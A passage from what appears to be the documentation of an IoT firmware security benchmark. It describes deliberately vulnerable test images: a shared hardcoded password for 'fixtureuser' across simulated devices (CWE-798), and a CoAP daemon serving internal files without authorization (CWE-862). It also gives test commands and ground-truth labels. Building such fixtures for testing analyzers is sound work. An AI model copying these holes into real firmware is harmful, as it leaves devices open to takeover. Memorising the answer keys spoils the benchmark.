There is no credential generation, per-device provisioning or external password
source. Thus every copy of this firmware contains the same extractable account
credential, even though the database is root-owned with mode `0600`.

Expected static-analysis finding: trace that installed account record and its
fixed plaintext password into the local helper's authentication comparisons,
then identify deterministic credential reuse. A password-looking string alone
is insufficient. Expected ground-truth label: **Hardcoded credentials —
Hardcoding the user passwords**. Corresponding weakness: **CWE-798 — Use of
Hard-coded Credentials**. Safe remediation: remove the embedded shared password,
enroll a unique credential for this installation and store a salted password hash
outside the distributable image, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=healthmonitor-cwe798-hardcoded-user-passwords docker compose run --rm yocto
FIRMWARE=healthmonitor-cwe798-hardcoded-user-passwords ./scripts/run-qemu.sh
~~~

Local runtime test (inside this guest's root serial console):

~~~bash
printf '%s\n' 'fixture-password-123' | iotbench-fixture-auth fixtureuser
sh /usr/share/iotbench/hardcoded-user-passwords/test-guest.sh healthmonitor
~~~

Expected: `HARDCODED_USER_PASSWORD_ACCEPTED` and `AUTHENTICATED_AS=fixtureuser`,
then four regression `PASS` lines; both commands exit zero. Wrong credentials
are rejected with exit 1. The helper grants only a marker, no OS access.
For offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-hardcoded-user-passwords.py \
  --image /export/healthmonitor-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-healthmonitor-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Alternatively, let the host runner boot, test and
close this image separately from a manually running guest:

~~~bash
python3 scripts/test-hardcoded-user-passwords.py --device healthmonitor
~~~


### Hardcoding User Passwords — ipcamera

Simulated device: **surveillance IP camera**, using the existing
`meta-iotbench/recipes-devices/ipcamera/` profile. Firmware directory:
`deploy-images/ipcamera-cwe798-hardcoded-user-passwords/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-ipcamera-cwe798-hardcoded-user-passwords.bb`.
For the default machine, the rootfs is
`deploy-images/ipcamera-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-ipcamera-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in that same directory.

Relevant firmware files are
`/etc/iotbench/hardcoded-user-passwords/accounts.conf` (the real local
application account database), `/usr/bin/iotbench-fixture-auth` (its
credential consumer), and `NOTICE`, `ground-truth.json` and `test-guest.sh`
under `/usr/share/iotbench/hardcoded-user-passwords/`. The corresponding
sources are in `meta-iotbench/recipes-vulns/cwe798-hardcoded-user-passwords/`.
The device identity remains in `/etc/iotbench/device.conf`.

The synthetic application account is **`fixtureuser`**. Its password,
**`fixture-password-123`**, is hardcoded directly in `accounts.conf` as
`fixtureuser:fixture-password-123`. The package recipe installs this record
verbatim at image build time; the local helper reads it and requires matching
account and password before returning its benign authentication marker.
There is no credential generation, per-device provisioning or external password
source. Thus every copy of this firmware contains the same extractable account
credential, even though the database is root-owned with mode `0600`.

Expected static-analysis finding: trace that installed account record and its
fixed plaintext password into the local helper's authentication comparisons,
then identify deterministic credential reuse. A password-looking string alone
is insufficient. Expected ground-truth label: **Hardcoded credentials —
Hardcoding the user passwords**. Corresponding weakness: **CWE-798 — Use of
Hard-coded Credentials**. Safe remediation: remove the embedded shared password,
enroll a unique credential for this installation and store a salted password hash
outside the distributable image, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=ipcamera-cwe798-hardcoded-user-passwords docker compose run --rm yocto
FIRMWARE=ipcamera-cwe798-hardcoded-user-passwords ./scripts/run-qemu.sh
~~~

Local runtime test (inside this guest's root serial console):

~~~bash
printf '%s\n' 'fixture-password-123' | iotbench-fixture-auth fixtureuser
sh /usr/share/iotbench/hardcoded-user-passwords/test-guest.sh ipcamera
~~~

Expected: `HARDCODED_USER_PASSWORD_ACCEPTED` and `AUTHENTICATED_AS=fixtureuser`,
then four regression `PASS` lines; both commands exit zero. Wrong credentials
are rejected with exit 1. The helper grants only a marker, no OS access.
For offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-hardcoded-user-passwords.py \
  --image /export/ipcamera-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-ipcamera-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Alternatively, let the host runner boot, test and
close this image separately from a manually running guest:

~~~bash
python3 scripts/test-hardcoded-user-passwords.py --device ipcamera
~~~


### Hardcoding User Passwords — plc

Simulated device: **industrial PLC gateway (OT)**, using the existing
`meta-iotbench/recipes-devices/plc/` profile. Firmware directory:
`deploy-images/plc-cwe798-hardcoded-user-passwords/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-plc-cwe798-hardcoded-user-passwords.bb`.
For the default machine, the rootfs is
`deploy-images/plc-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-plc-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in that same directory.

Relevant firmware files are
`/etc/iotbench/hardcoded-user-passwords/accounts.conf` (the real local
application account database), `/usr/bin/iotbench-fixture-auth` (its
credential consumer), and `NOTICE`, `ground-truth.json` and `test-guest.sh`
under `/usr/share/iotbench/hardcoded-user-passwords/`. The corresponding
sources are in `meta-iotbench/recipes-vulns/cwe798-hardcoded-user-passwords/`.
The device identity remains in `/etc/iotbench/device.conf`.

The synthetic application account is **`fixtureuser`**. Its password,
**`fixture-password-123`**, is hardcoded directly in `accounts.conf` as
`fixtureuser:fixture-password-123`. The package recipe installs this record
verbatim at image build time; the local helper reads it and requires matching
account and password before returning its benign authentication marker.
There is no credential generation, per-device provisioning or external password
source. Thus every copy of this firmware contains the same extractable account
credential, even though the database is root-owned with mode `0600`.

Expected static-analysis finding: trace that installed account record and its
fixed plaintext password into the local helper's authentication comparisons,
then identify deterministic credential reuse. A password-looking string alone
is insufficient. Expected ground-truth label: **Hardcoded credentials —
Hardcoding the user passwords**. Corresponding weakness: **CWE-798 — Use of
Hard-coded Credentials**. Safe remediation: remove the embedded shared password,
enroll a unique credential for this installation and store a salted password hash
outside the distributable image, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=plc-cwe798-hardcoded-user-passwords docker compose run --rm yocto
FIRMWARE=plc-cwe798-hardcoded-user-passwords ./scripts/run-qemu.sh
~~~

Local runtime test (inside this guest's root serial console):

~~~bash
printf '%s\n' 'fixture-password-123' | iotbench-fixture-auth fixtureuser
sh /usr/share/iotbench/hardcoded-user-passwords/test-guest.sh plc
~~~

Expected: `HARDCODED_USER_PASSWORD_ACCEPTED` and `AUTHENTICATED_AS=fixtureuser`,
then four regression `PASS` lines; both commands exit zero. Wrong credentials
are rejected with exit 1. The helper grants only a marker, no OS access.
For offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-hardcoded-user-passwords.py \
  --image /export/plc-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-plc-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Alternatively, let the host runner boot, test and
close this image separately from a manually running guest:

~~~bash
python3 scripts/test-hardcoded-user-passwords.py --device plc
~~~


### Hardcoding User Passwords — router

Simulated device: **network gateway/router**, using the existing
`meta-iotbench/recipes-devices/router/` profile. Firmware directory:
`deploy-images/router-cwe798-hardcoded-user-passwords/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-router-cwe798-hardcoded-user-passwords.bb`.
For the default machine, the rootfs is
`deploy-images/router-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-router-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in that same directory.

Relevant firmware files are
`/etc/iotbench/hardcoded-user-passwords/accounts.conf` (the real local
application account database), `/usr/bin/iotbench-fixture-auth` (its
credential consumer), and `NOTICE`, `ground-truth.json` and `test-guest.sh`
under `/usr/share/iotbench/hardcoded-user-passwords/`. The corresponding
sources are in `meta-iotbench/recipes-vulns/cwe798-hardcoded-user-passwords/`.
The device identity remains in `/etc/iotbench/device.conf`.

The synthetic application account is **`fixtureuser`**. Its password,
**`fixture-password-123`**, is hardcoded directly in `accounts.conf` as
`fixtureuser:fixture-password-123`. The package recipe installs this record
verbatim at image build time; the local helper reads it and requires matching
account and password before returning its benign authentication marker.
There is no credential generation, per-device provisioning or external password
source. Thus every copy of this firmware contains the same extractable account
credential, even though the database is root-owned with mode `0600`.

Expected static-analysis finding: trace that installed account record and its
fixed plaintext password into the local helper's authentication comparisons,
then identify deterministic credential reuse. A password-looking string alone
is insufficient. Expected ground-truth label: **Hardcoded credentials —
Hardcoding the user passwords**. Corresponding weakness: **CWE-798 — Use of
Hard-coded Credentials**. Safe remediation: remove the embedded shared password,
enroll a unique credential for this installation and store a salted password hash
outside the distributable image, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=router-cwe798-hardcoded-user-passwords docker compose run --rm yocto
FIRMWARE=router-cwe798-hardcoded-user-passwords ./scripts/run-qemu.sh
~~~

Local runtime test (inside this guest's root serial console):

~~~bash
printf '%s\n' 'fixture-password-123' | iotbench-fixture-auth fixtureuser
sh /usr/share/iotbench/hardcoded-user-passwords/test-guest.sh router
~~~

Expected: `HARDCODED_USER_PASSWORD_ACCEPTED` and `AUTHENTICATED_AS=fixtureuser`,
then four regression `PASS` lines; both commands exit zero. Wrong credentials
are rejected with exit 1. The helper grants only a marker, no OS access.
For offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-hardcoded-user-passwords.py \
  --image /export/router-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-router-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Alternatively, let the host runner boot, test and
close this image separately from a manually running guest:

~~~bash
python3 scripts/test-hardcoded-user-passwords.py --device router
~~~


### Hardcoding User Passwords — smartbulb

Simulated device: **lighting smart bulb**, using the existing
`meta-iotbench/recipes-devices/smartbulb/` profile. Firmware directory:
`deploy-images/smartbulb-cwe798-hardcoded-user-passwords/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartbulb-cwe798-hardcoded-user-passwords.bb`.
For the default machine, the rootfs is
`deploy-images/smartbulb-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-smartbulb-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in that same directory.

Relevant firmware files are
`/etc/iotbench/hardcoded-user-passwords/accounts.conf` (the real local
application account database), `/usr/bin/iotbench-fixture-auth` (its
credential consumer), and `NOTICE`, `ground-truth.json` and `test-guest.sh`
under `/usr/share/iotbench/hardcoded-user-passwords/`. The corresponding
sources are in `meta-iotbench/recipes-vulns/cwe798-hardcoded-user-passwords/`.
The device identity remains in `/etc/iotbench/device.conf`.

The synthetic application account is **`fixtureuser`**. Its password,
**`fixture-password-123`**, is hardcoded directly in `accounts.conf` as
`fixtureuser:fixture-password-123`. The package recipe installs this record
verbatim at image build time; the local helper reads it and requires matching
account and password before returning its benign authentication marker.
There is no credential generation, per-device provisioning or external password
source. Thus every copy of this firmware contains the same extractable account
credential, even though the database is root-owned with mode `0600`.

Expected static-analysis finding: trace that installed account record and its
fixed plaintext password into the local helper's authentication comparisons,
then identify deterministic credential reuse. A password-looking string alone
is insufficient. Expected ground-truth label: **Hardcoded credentials —
Hardcoding the user passwords**. Corresponding weakness: **CWE-798 — Use of
Hard-coded Credentials**. Safe remediation: remove the embedded shared password,
enroll a unique credential for this installation and store a salted password hash
outside the distributable image, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartbulb-cwe798-hardcoded-user-passwords docker compose run --rm yocto
FIRMWARE=smartbulb-cwe798-hardcoded-user-passwords ./scripts/run-qemu.sh
~~~

Local runtime test (inside this guest's root serial console):

~~~bash
printf '%s\n' 'fixture-password-123' | iotbench-fixture-auth fixtureuser
sh /usr/share/iotbench/hardcoded-user-passwords/test-guest.sh smartbulb
~~~

Expected: `HARDCODED_USER_PASSWORD_ACCEPTED` and `AUTHENTICATED_AS=fixtureuser`,
then four regression `PASS` lines; both commands exit zero. Wrong credentials
are rejected with exit 1. The helper grants only a marker, no OS access.
For offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-hardcoded-user-passwords.py \
  --image /export/smartbulb-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-smartbulb-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Alternatively, let the host runner boot, test and
close this image separately from a manually running guest:

~~~bash
python3 scripts/test-hardcoded-user-passwords.py --device smartbulb
~~~


### Hardcoding User Passwords — smarthub

Simulated device: **controller/smart hub**, using the existing
`meta-iotbench/recipes-devices/smarthub/` profile. Firmware directory:
`deploy-images/smarthub-cwe798-hardcoded-user-passwords/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smarthub-cwe798-hardcoded-user-passwords.bb`.
For the default machine, the rootfs is
`deploy-images/smarthub-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-smarthub-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in that same directory.

Relevant firmware files are
`/etc/iotbench/hardcoded-user-passwords/accounts.conf` (the real local
application account database), `/usr/bin/iotbench-fixture-auth` (its
credential consumer), and `NOTICE`, `ground-truth.json` and `test-guest.sh`
under `/usr/share/iotbench/hardcoded-user-passwords/`. The corresponding
sources are in `meta-iotbench/recipes-vulns/cwe798-hardcoded-user-passwords/`.
The device identity remains in `/etc/iotbench/device.conf`.

The synthetic application account is **`fixtureuser`**. Its password,
**`fixture-password-123`**, is hardcoded directly in `accounts.conf` as
`fixtureuser:fixture-password-123`. The package recipe installs this record
verbatim at image build time; the local helper reads it and requires matching
account and password before returning its benign authentication marker.
There is no credential generation, per-device provisioning or external password
source. Thus every copy of this firmware contains the same extractable account
credential, even though the database is root-owned with mode `0600`.

Expected static-analysis finding: trace that installed account record and its
fixed plaintext password into the local helper's authentication comparisons,
then identify deterministic credential reuse. A password-looking string alone
is insufficient. Expected ground-truth label: **Hardcoded credentials —
Hardcoding the user passwords**. Corresponding weakness: **CWE-798 — Use of
Hard-coded Credentials**. Safe remediation: remove the embedded shared password,
enroll a unique credential for this installation and store a salted password hash
outside the distributable image, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smarthub-cwe798-hardcoded-user-passwords docker compose run --rm yocto
FIRMWARE=smarthub-cwe798-hardcoded-user-passwords ./scripts/run-qemu.sh
~~~

Local runtime test (inside this guest's root serial console):

~~~bash
printf '%s\n' 'fixture-password-123' | iotbench-fixture-auth fixtureuser
sh /usr/share/iotbench/hardcoded-user-passwords/test-guest.sh smarthub
~~~

Expected: `HARDCODED_USER_PASSWORD_ACCEPTED` and `AUTHENTICATED_AS=fixtureuser`,
then four regression `PASS` lines; both commands exit zero. Wrong credentials
are rejected with exit 1. The helper grants only a marker, no OS access.
For offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-hardcoded-user-passwords.py \
  --image /export/smarthub-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-smarthub-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Alternatively, let the host runner boot, test and
close this image separately from a manually running guest:

~~~bash
python3 scripts/test-hardcoded-user-passwords.py --device smarthub
~~~


### Hardcoding User Passwords — smartplug

Simulated device: **energy-management smart plug**, using the existing
`meta-iotbench/recipes-devices/smartplug/` profile. Firmware directory:
`deploy-images/smartplug-cwe798-hardcoded-user-passwords/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartplug-cwe798-hardcoded-user-passwords.bb`.
For the default machine, the rootfs is
`deploy-images/smartplug-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-smartplug-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in that same directory.

Relevant firmware files are
`/etc/iotbench/hardcoded-user-passwords/accounts.conf` (the real local
application account database), `/usr/bin/iotbench-fixture-auth` (its
credential consumer), and `NOTICE`, `ground-truth.json` and `test-guest.sh`
under `/usr/share/iotbench/hardcoded-user-passwords/`. The corresponding
sources are in `meta-iotbench/recipes-vulns/cwe798-hardcoded-user-passwords/`.
The device identity remains in `/etc/iotbench/device.conf`.

The synthetic application account is **`fixtureuser`**. Its password,
**`fixture-password-123`**, is hardcoded directly in `accounts.conf` as
`fixtureuser:fixture-password-123`. The package recipe installs this record
verbatim at image build time; the local helper reads it and requires matching
account and password before returning its benign authentication marker.
There is no credential generation, per-device provisioning or external password
source. Thus every copy of this firmware contains the same extractable account
credential, even though the database is root-owned with mode `0600`.

Expected static-analysis finding: trace that installed account record and its
fixed plaintext password into the local helper's authentication comparisons,
then identify deterministic credential reuse. A password-looking string alone
is insufficient. Expected ground-truth label: **Hardcoded credentials —
Hardcoding the user passwords**. Corresponding weakness: **CWE-798 — Use of
Hard-coded Credentials**. Safe remediation: remove the embedded shared password,
enroll a unique credential for this installation and store a salted password hash
outside the distributable image, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartplug-cwe798-hardcoded-user-passwords docker compose run --rm yocto
FIRMWARE=smartplug-cwe798-hardcoded-user-passwords ./scripts/run-qemu.sh
~~~

Local runtime test (inside this guest's root serial console):

~~~bash
printf '%s\n' 'fixture-password-123' | iotbench-fixture-auth fixtureuser
sh /usr/share/iotbench/hardcoded-user-passwords/test-guest.sh smartplug
~~~

Expected: `HARDCODED_USER_PASSWORD_ACCEPTED` and `AUTHENTICATED_AS=fixtureuser`,
then four regression `PASS` lines; both commands exit zero. Wrong credentials
are rejected with exit 1. The helper grants only a marker, no OS access.
For offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-hardcoded-user-passwords.py \
  --image /export/smartplug-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-smartplug-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Alternatively, let the host runner boot, test and
close this image separately from a manually running guest:

~~~bash
python3 scripts/test-hardcoded-user-passwords.py --device smartplug
~~~


### Hardcoding User Passwords — smartspeaker

Simulated device: **audio/voice-assistant smart speaker**, using the existing
`meta-iotbench/recipes-devices/smartspeaker/` profile. Firmware directory:
`deploy-images/smartspeaker-cwe798-hardcoded-user-passwords/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartspeaker-cwe798-hardcoded-user-passwords.bb`.
For the default machine, the rootfs is
`deploy-images/smartspeaker-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-smartspeaker-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in that same directory.

Relevant firmware files are
`/etc/iotbench/hardcoded-user-passwords/accounts.conf` (the real local
application account database), `/usr/bin/iotbench-fixture-auth` (its
credential consumer), and `NOTICE`, `ground-truth.json` and `test-guest.sh`
under `/usr/share/iotbench/hardcoded-user-passwords/`. The corresponding
sources are in `meta-iotbench/recipes-vulns/cwe798-hardcoded-user-passwords/`.
The device identity remains in `/etc/iotbench/device.conf`.

The synthetic application account is **`fixtureuser`**. Its password,
**`fixture-password-123`**, is hardcoded directly in `accounts.conf` as
`fixtureuser:fixture-password-123`. The package recipe installs this record
verbatim at image build time; the local helper reads it and requires matching
account and password before returning its benign authentication marker.
There is no credential generation, per-device provisioning or external password
source. Thus every copy of this firmware contains the same extractable account
credential, even though the database is root-owned with mode `0600`.

Expected static-analysis finding: trace that installed account record and its
fixed plaintext password into the local helper's authentication comparisons,
then identify deterministic credential reuse. A password-looking string alone
is insufficient. Expected ground-truth label: **Hardcoded credentials —
Hardcoding the user passwords**. Corresponding weakness: **CWE-798 — Use of
Hard-coded Credentials**. Safe remediation: remove the embedded shared password,
enroll a unique credential for this installation and store a salted password hash
outside the distributable image, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartspeaker-cwe798-hardcoded-user-passwords docker compose run --rm yocto
FIRMWARE=smartspeaker-cwe798-hardcoded-user-passwords ./scripts/run-qemu.sh
~~~

Local runtime test (inside this guest's root serial console):

~~~bash
printf '%s\n' 'fixture-password-123' | iotbench-fixture-auth fixtureuser
sh /usr/share/iotbench/hardcoded-user-passwords/test-guest.sh smartspeaker
~~~

Expected: `HARDCODED_USER_PASSWORD_ACCEPTED` and `AUTHENTICATED_AS=fixtureuser`,
then four regression `PASS` lines; both commands exit zero. Wrong credentials
are rejected with exit 1. The helper grants only a marker, no OS access.
For offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-hardcoded-user-passwords.py \
  --image /export/smartspeaker-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-smartspeaker-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Alternatively, let the host runner boot, test and
close this image separately from a manually running guest:

~~~bash
python3 scripts/test-hardcoded-user-passwords.py --device smartspeaker
~~~


### Hardcoding User Passwords — thermostat

Simulated device: **climate-control thermostat**, using the existing
`meta-iotbench/recipes-devices/thermostat/` profile. Firmware directory:
`deploy-images/thermostat-cwe798-hardcoded-user-passwords/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-thermostat-cwe798-hardcoded-user-passwords.bb`.
For the default machine, the rootfs is
`deploy-images/thermostat-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-thermostat-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst`;
the kernel is `Image` in that same directory.

Relevant firmware files are
`/etc/iotbench/hardcoded-user-passwords/accounts.conf` (the real local
application account database), `/usr/bin/iotbench-fixture-auth` (its
credential consumer), and `NOTICE`, `ground-truth.json` and `test-guest.sh`
under `/usr/share/iotbench/hardcoded-user-passwords/`. The corresponding
sources are in `meta-iotbench/recipes-vulns/cwe798-hardcoded-user-passwords/`.
The device identity remains in `/etc/iotbench/device.conf`.

The synthetic application account is **`fixtureuser`**. Its password,
**`fixture-password-123`**, is hardcoded directly in `accounts.conf` as
`fixtureuser:fixture-password-123`. The package recipe installs this record
verbatim at image build time; the local helper reads it and requires matching
account and password before returning its benign authentication marker.
There is no credential generation, per-device provisioning or external password
source. Thus every copy of this firmware contains the same extractable account
credential, even though the database is root-owned with mode `0600`.

Expected static-analysis finding: trace that installed account record and its
fixed plaintext password into the local helper's authentication comparisons,
then identify deterministic credential reuse. A password-looking string alone
is insufficient. Expected ground-truth label: **Hardcoded credentials —
Hardcoding the user passwords**. Corresponding weakness: **CWE-798 — Use of
Hard-coded Credentials**. Safe remediation: remove the embedded shared password,
enroll a unique credential for this installation and store a salted password hash
outside the distributable image, as described above.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=thermostat-cwe798-hardcoded-user-passwords docker compose run --rm yocto
FIRMWARE=thermostat-cwe798-hardcoded-user-passwords ./scripts/run-qemu.sh
~~~

Local runtime test (inside this guest's root serial console):

~~~bash
printf '%s\n' 'fixture-password-123' | iotbench-fixture-auth fixtureuser
sh /usr/share/iotbench/hardcoded-user-passwords/test-guest.sh thermostat
~~~

Expected: `HARDCODED_USER_PASSWORD_ACCEPTED` and `AUTHENTICATED_AS=fixtureuser`,
then four regression `PASS` lines; both commands exit zero. Wrong credentials
are rejected with exit 1. The helper grants only a marker, no OS access.
For offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-hardcoded-user-passwords.py \
  --image /export/thermostat-cwe798-hardcoded-user-passwords/qemuarm64/iotbench-thermostat-cwe798-hardcoded-user-passwords-qemuarm64.rootfs.ext4.zst
~~~

Expected: two `PASS` lines. Alternatively, let the host runner boot, test and
close this image separately from a manually running guest:

~~~bash
python3 scripts/test-hardcoded-user-passwords.py --device thermostat
~~~


## CoAP Server Communicating with Vulnerable Internal Files

### Build, boot and manual testing

**What this tests.** Two CoAP resources return internal configuration and
maintenance files without checking the requester's role.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe862-coap-internal-files docker compose run --rm yocto
QEMU_HTTP_PORT=18080 QEMU_COAP_PORT=5683 \
  FIRMWARE=router-cwe862-coap-internal-files ./scripts/run-qemu.sh
```

Wait for the `login:` prompt; guest login is not required to send requests.
**Test — second host terminal:**

```bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
```

Here, `--get` performs a single manual read using the included Python client.
Expected: `CoAP 2.05` responses containing `COAP_INTERNAL_CONFIG_EXPOSED` and
`COAP_INTERNAL_MAINTENANCE_EXPOSED`, respectively. The configuration includes
`device_class=router`. No credentials are supplied. These are **UDP CoAP**
requests: use this client rather than the browser's HTTP address bar.

**Comparison — guest:** use `cat` to read
`/usr/share/iotbench/coap-internal-files/internal/device.conf` and
`/usr/share/iotbench/coap-internal-files/internal/maintenance.dat`.
Their contents must match the two responses.

> INTENTIONALLY INSECURE SYNTHETIC TEST FIXTURE — LOCAL SECURITY TESTING ONLY — NOT FOR DEPLOYMENT

### Scenario, authorization boundary and ground truth

The eleven `<device>-cwe862-coap-internal-files` images reuse the existing
device profiles, common Yocto image, pinned layers, systemd startup conventions,
architecture selector and build/export scripts. Each installs exactly one
vulnerability package, `cwe862-coap-internal-files`. The repository had no
CoAP-specific fixture; the existing `meta-networking` layer already supplies
the pinned `libcoap` recipe used by this firmware-integrated daemon.

The expected ground-truth label is **CoAP server communicating with vulnerable
internal files**. The modeled vulnerability is specifically **unsafe exposure
of synthetic internal firmware files through a CoAP server because the CoAP
resource lacks adequate access control**. We classify the absent resource
authorization as [CWE-862 — Missing Authorization](https://cwe.mitre.org/data/definitions/862.html);
disclosure of internal information is its consequence, not a second fixture
vulnerability. There is no credential or authentication-bypass chain.

The attacker position is a CoAP client that can reach guest UDP port `5683`.
The normal host runner forwards it only through `127.0.0.1`. A request without
any identity, credential, session or maintenance role receives the internal
file bytes. CoAP message tokens correlate requests and responses; they do not
authenticate the client.

### Resource-to-file mappings and intended privacy

All application file access is restricted to this predefined mapping:

| CoAP GET resource | Fixed internal firmware file | Synthetic contents / exposure signal |
| --- | --- | --- |
| `/device/config` | `/usr/share/iotbench/coap-internal-files/internal/device.conf` | Device class, fake asset reference, calibration profile and diagnostic mode; `COAP_INTERNAL_CONFIG_EXPOSED` |
| `/maintenance/info` | `/usr/share/iotbench/coap-internal-files/internal/maintenance.dat` | Fake maintenance reference, service window and self-test state; `COAP_INTERNAL_MAINTENANCE_EXPOSED` |

Both files are shipped in the firmware, marked `fixture_scope=internal-maintenance-only`,
and contain the exact fixture warning. They contain no host data, real credentials,
API keys, tokens, personal data or external-system information. They are internal
maintenance/configuration artifacts by fixture policy, rather than intentionally
public telemetry. Normal Unix permissions restrict their direct access to root
and the daemon's service group, but the protocol handler omits the maintenance
authorization boundary before returning them to any reachable client.

The source `files/device.conf` has an `@DEVICE@` placeholder. The image-only
`iotbench-coap-internal-files.inc` replaces it with the profile's existing
`IOTBENCH_DEVICE` at build time, checks ownership/permissions and appends NOTICE
to `/etc/motd`. This creates deterministic per-device synthetic configuration.
`maintenance.dat` and daemon code are identical across the eleven images.
There is no runtime file generation or mutation by the service.

### Server implementation, startup and static data flow

The source directory is
`meta-iotbench/recipes-vulns/cwe862-coap-internal-files/`. Its recipe uses local
`file://` sources and standard `${CC}`, `${CFLAGS}` and `${LDFLAGS}` with
`pkg-config --cflags --libs libcoap-3-openssl`. The existing pinned
`libcoap_4.3.5b.bb` provides RFC 7252 CoAP framing, URI matching and responses;
the daemon creates only an IPv4 UDP endpoint. No DTLS/TCP service, external
client connection, scan, shell or command execution is configured. See
[RFC 7252](https://www.rfc-editor.org/rfc/rfc7252.html) and the
[libcoap handler API](https://libcoap.net/doc/reference/4.3.5/man_coap_handler.html).

The static data flow is:

~~~text
CoAP GET /device/config or /maintenance/info
  -> libcoap matches an explicitly registered resource
  -> get_internal_file(resource)
  -> resource userdata selects a constant filename from resources[]
  -> openat(pre-opened fixed internal directory, constant filename, O_RDONLY)
  -> fstat and bounded read into content[]
  -> coap_add_data(response, byte_count, content)
  -> libcoap sends 2.05 Content with the internal file bytes
~~~

The `resources[]` table in `iotbench-coap-internal-files.c` fixes both URI and
filename; `coap_resource_set_userdata` ties each resource to its mapping.
`coap_register_request_handler(..., COAP_REQUEST_GET, get_internal_file)`
registers the only application operation. `main` opens the fixed internal
directory once. Inside `get_internal_file`, `openat` opens the mapped file and
`read` supplies the bytes later passed to `coap_add_data`. The handler sets
`COAP_RESPONSE_CODE_CONTENT`; libcoap transmits the response when it returns.
The installed source annotation `handler.c` accompanies the executable to make
this short flow directly available to static-analysis tools.

The intentionally missing check is **authorization of the requesting client
for internal maintenance-file access before `openat`/`read`**. Checking the
file's type or the URI syntax is not an authorization check. A static analyzer
should correlate the registered CoAP handlers, constant internal files,
read-to-response data flow and absence of that access decision.

| Component | Firmware path / permissions |
| --- | --- |
| Daemon | `/usr/bin/iotbench-coap-internal-files`, root:root `0755`, no SUID/SGID |
| Startup | `/usr/lib/systemd/system/iotbench-coap-internal-files.service`; enabled for `multi-user.target` |
| Service identity | `coapfixture`, UID/GID `960:960`, locked password and `/bin/false` shell |
| Internal directory | `/usr/share/iotbench/coap-internal-files/internal/`, root:coapfixture `0750` |
| Internal files | `device.conf` and `maintenance.dat`, root:coapfixture `0640` |
| Analysis source | `/usr/share/iotbench/coap-internal-files/handler.c`, `0644` |
| Ground truth | `/usr/share/iotbench/coap-internal-files/ground-truth.json`, `0644` |
| Warning | `/usr/share/iotbench/coap-internal-files/NOTICE` and `/etc/motd` |

Yocto's existing `useradd` and `systemd` classes install the locked service
identity and enable startup. The unit uses `Type=simple`,
`ExecStart=/usr/bin/iotbench-coap-internal-files`, `User=coapfixture`,
